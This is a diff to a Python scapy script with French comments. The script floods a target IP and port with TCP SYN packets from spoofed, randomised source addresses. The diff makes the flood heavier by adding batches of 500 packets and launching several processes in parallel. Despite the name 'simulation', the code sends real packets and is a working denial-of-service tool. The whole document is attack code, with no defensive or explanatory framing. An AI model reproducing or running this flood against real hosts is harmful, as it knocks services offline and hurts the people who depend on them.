@@ -1,33 +1,50 @@
 from scapy.all import IP, TCP, send
-import random
 import time
+import random
+from multiprocessing import Process
 
-# Configuration de l'attaque
-target_ip = "192.168.1.81"  # Adresse cible
-target_port = 80         # Port cible
-flood_duration = 10      # Durée de l'attaque (secondes)
-
-# Générer des IP sources aléatoires
 def generate_random_ip():
-    return ".".join([str(random.randint(1, 254)) for _ in range(4)])
+    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
-# Envoi massif de paquets TCP SYN
-def simulate_ddos(target_ip, target_port, duration):
+def simulate_ddos(target_ip, origin_ip, target_port, duration, batch_size=500):
     start_time = time.time()
     packet_count = 0
-    print("Starting DDoS simulation...")
+    print("Starting aggressive DDoS simulation...")
 
     while time.time() - start_time < duration:
-        src_ip = generate_random_ip()
-        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
-        send(packet, verbose=0)  # Envoi silencieux du paquet
-        packet_count += 1
+        packets = [] 
+        for _ in range(batch_size):
+            if origin_ip == "":
+                src_ip = generate_random_ip()
+            else:
+                src_ip = origin_ip
+            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
+            packets.append(packet)
 
-        if packet_count % 1000 == 0:
+        send(packets, verbose=0)
+        packet_count += batch_size
+
+        if packet_count % (batch_size * 10) == 0:
             print(f"Sent {packet_count} packets so far...")
 
-    print(f"Attack finished. Total packets sent: {packet_count}")
+    print(f"DDoS simulation finished. Total packets sent: {packet_count}")
 
-# Lancer l'attaque
+def launch_ddos(target_ip, origin_ip, target_port, duration, num_threads=4):
+    processes = []
+    for _ in range(num_threads):
+        p = Process(target=simulate_ddos, args=(target_ip, origin_ip, target_port, duration))
+        processes.append(p)
+        p.start()
+
+    for p in processes:
+        p.join()
+
+# Exemple d'utilisation
 if __name__ == "__main__":
-    simulate_ddos(target_ip, target_port, flood_duration)
+    target_ip = "192.168.100.134"  # Remplacez par l'IP cible
+    origin_ip = ""              # Indiquer une ip ou laisser vide pour une ip aléatoire
+    target_port = 80            # Remplacez par le port cible
+    duration = 30               # Durée de l'attaque en secondes
+    num_threads = 10             # Nombre de processus pour augmenter l'intensité
+
+    launch_ddos(target_ip, origin_ip, target_port, duration, num_threads=num_threads)
